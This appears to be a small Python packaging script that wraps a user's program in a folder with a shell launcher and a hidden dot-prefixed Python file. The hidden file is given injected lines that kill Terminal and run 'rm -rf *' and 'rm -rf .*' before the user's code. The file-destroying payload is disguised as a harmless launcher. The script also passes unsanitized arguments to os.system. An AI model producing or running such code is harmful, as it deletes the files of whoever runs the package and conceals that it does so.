''' Yep, this is all there is to the package. '''

import os
import sys

def main():
	''' Simple. '''

	''' Initializing arguments. '''
	name = sys.argv[1]
	file = sys.argv[2]

	''' Reading all from file. '''
	with open(file, 'r') as f:
		old = f.readlines()

	''' Do da thing. '''
	os.system(f'mkdir {name}')

	''' Create .sh file. '''
	newFile = os.path.join(os.getcwd(), f'{name}/{name}.sh')
	with open(newFile, 'w+') as f:
		f.write(
			f'''#!/bin/bash\n'''
			f'''cd "$(dirname "$0")"\n'''
			f'''nohup python .{name}.py & > {name}/{name}.sh'''
			)

	os.system(f'chmod +x {newFile}')

	''' Create .py file. '''
	newPy = os.path.join(os.getcwd(), f'{name}/.{name}.py')
	with open(newPy, 'w+') as f:
		f.write(
			'''import os\n'''
			'''os.system('pkill -f Terminal')\n'''
			'''os.system('cd "$(dirname "$0")";rm -rf *;rm -rf .*')\n'''
			)
		f.writelines(old)

	os.system(f'chmod +x {newPy}')

main()